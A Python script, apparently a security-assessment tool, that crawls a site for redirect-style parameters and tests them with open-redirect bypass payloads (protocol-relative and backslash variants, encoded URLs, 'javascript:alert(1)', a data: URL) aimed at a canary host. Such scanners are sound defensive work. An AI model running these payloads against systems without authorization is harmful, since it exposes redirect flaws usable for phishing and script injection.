#!/usr/bin/env python3
"""Probe redirect parameters on authorized targets for open redirect behavior."""

import argparse
import re
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "security-assessment-scripts/1.0"
CANARY = "canary-redirect.example"

HREF_RE = re.compile(r"""href=["']([^"']+)["']""", re.IGNORECASE)

PAYLOADS = [
  "https://{c}/",
  "//{c}/",
  "///{c}/",
  "/\\{c}/",
  "/\\/\\{c}/",
  "https:/\\/{c}/",
  "https:/{c}",
  "%2F%2F{c}%2F",
  "https%3A%2F%2F{c}%2F",
  "javascript:alert(1)",
  "data:text/html,<h1>hi</h1>",
]

INTERESTING_PARAMS = ["url", "next", "redirect", "redirect_url", "redirect_uri", "return", "returnUrl", "returnTo", "goto", "go", "dest", "destination", "continue", "target", "rurl", "u", "link"]


def request_no_redirect(url, timeout):
  opener = urllib.request.build_opener(NoRedirect())
  request = urllib.request.Request(url, headers={"User-Agent": UA})
  try:
    response = opener.open(request, timeout=timeout)
    return getattr(response, "status", response.code), dict(response.headers), response.read(8192).decode("utf-8", "replace")
  except urllib.error.HTTPError as exc:
    return exc.code, dict(exc.headers), exc.read(8192).decode("utf-8", "replace")


class NoRedirect(urllib.request.HTTPRedirectHandler):
  def redirect_request(self, req, fp, code, msg, headers, newurl):
    return None


def classify(url, target_host):
  status, headers, body = request_no_redirect(url, timeout=10)
  location = headers.get("Location") or headers.get("location") or ""

  if status in (301, 302, 303, 307, 308) and location:
    parsed_loc = urllib.parse.urlsplit(location)
    if CANARY in (parsed_loc.netloc or "") or CANARY in location:
      return f"OPEN REDIRECT -> {location}", True
    if parsed_loc.netloc and parsed_loc.netloc != target_host:
      return f"redirects off-site to {parsed_loc.netloc} (review)", False
    if CANARY in location:
      return f"canary echoed in Location: {location[:100]}", False
    return f"{status} internal redirect -> {location[:80]}", False

  if CANARY in body:
    for line in body.splitlines():
      if CANARY in line.lower():
        return f"canary reflected in body: {line.strip()[:120]}", False
  if "meta http-equiv=\"refresh\"" in body.lower() and CANARY in body.lower():
    return "meta-refresh redirect contains canary", False

  return f"HTTP {status}, no redirect to canary", False


def discover_candidate_urls(base_url, body, limit):
  parsed_base = urllib.parse.urlsplit(base_url)
  origin = f"{parsed_base.scheme}://{parsed_base.netloc}"
  candidates = []
  for href in HREF_RE.findall(body):
    try:
      resolved = urllib.parse.urljoin(origin, href)
    except ValueError:
      continue
    if not resolved.startswith(origin):
      continue
    params = urllib.parse.parse_qs(urllib.parse.urlsplit(resolved).query)
    param_names = {name.lower() for name in params}
    for interesting in INTERESTING_PARAMS:
      if interesting.lower() in param_names and (resolved, interesting) not in candidates:
        candidates.append((resolved, interesting))
        break
    if len(candidates) >= limit:
      break
  return candidates


def main():
  parser = argparse.ArgumentParser(description="Test redirect parameters against an authorized target.")
  parser.add_argument("url", help="URL containing a parameter to test; use {PARAM} placeholder or --param name")
  parser.add_argument("--param", default="next", help="parameter name to inject into when the URL has no value for it")
  parser.add_argument("--crawl", action="store_true", help="fetch the URL first and auto-discover redirect-looking parameters")
  parser.add_argument("--delay", type=float, default=0.2, help="delay between requests in seconds")
  args = parser.parse_args()

  parsed = urllib.parse.urlsplit(args.url)
  target_host = parsed.netloc
  queries = []
  if args.crawl or ("{" not in args.url and "=" not in (parsed.query or "")):
    _, _, body = request_no_redirect(args.url, timeout=10)
    discovered = discover_candidate_urls(args.url, body, limit=20)
    print(f"[*] discovered {len(discovered)} candidate link(s) with redirect-style parameters")
    for candidate_url, candidate_param in discovered:
      queries.extend(build_queries(candidate_url, candidate_param))
  else:
    queries = build_queries(args.url, args.param)

  vulnerable = False
  for query_url in sorted(set(queries)):
    verdict, is_vuln = classify(query_url, target_host)
    flag = "[!]" if is_vuln else "[ ]"
    print(f"{flag} {verdict}")
    print(f"      {query_url[:150]}")
    if is_vuln:
      vulnerable = True
    time.sleep(args.delay)

  print()
  print("Open redirect confirmed." if vulnerable else "No open redirects confirmed with the tested payloads.")


def build_queries(template_url, param_name):
  split = urllib.parse.urlsplit(template_url)
  other_params = [pair for pair in split.query.split("&") if pair and pair.split("=", 1)[0] != param_name]
  built = []
  for payload in PAYLOADS:
    payload = payload.replace("{c}", CANARY)
    pairs = other_params + [f"{param_name}={payload}"]
    rebuilt = urllib.parse.SplitResult(
      scheme=split.scheme, netloc=split.netloc, path=split.path,
      query="&".join(pairs), fragment=split.fragment,
    )
    built.append(rebuilt.geturl())
  return built


if __name__ == "__main__":
  main()
